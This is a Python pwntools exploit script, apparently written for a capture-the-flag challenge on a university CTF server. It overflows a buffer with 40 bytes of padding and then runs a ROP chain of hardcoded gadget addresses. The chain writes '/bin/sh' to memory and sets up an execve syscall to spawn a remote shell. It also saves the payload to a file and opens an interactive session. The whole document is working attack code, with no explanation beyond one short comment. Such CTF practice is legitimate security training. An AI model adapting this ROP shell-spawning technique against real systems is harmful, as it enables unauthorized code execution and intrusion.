#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys
host="ctf.adl.csie.ncu.edu.tw"
port="11005"

#host = "127.0.0.1"
#port = "8889"

r=remote(host,port)


pop_rsi = p64(0x4017a7)
pop_rdx = p64(0x4371d5)
pop_rax = p64(0x46b408)
pop_rdi = p64(0x401693)
mov_ptr_rsi_rax = p64(0x467ad1)
int_80 = p64(0x4ae8a7)
syscall = p64(0x45b4c5)
binstring = '/bin/sh\x00'
write_in = p64(0x6c3000)
number_3b = '\x3b\x00\x00\x00\x00\x00\x00\x00'
number_0 = '\x00\x00\x00\x00\x00\x00\x00\x00'


payload ='a'*40 + pop_rax + binstring + pop_rsi + write_in + mov_ptr_rsi_rax + pop_rax + number_3b + pop_rsi + number_0 +pop_rdx + number_0 + pop_rdi + write_in + syscall 

#print('length of payload:',len(payload))

#print ('payload:',payload)


#print('write_in',write_in)

print(r.recvuntil("\n"))

#p64可以把一個64進位的位址值打包成\x形式的string
r.sendline(payload)
file = open('data.txt', 'w')
file.write(payload)
file.close()
r.interactive()
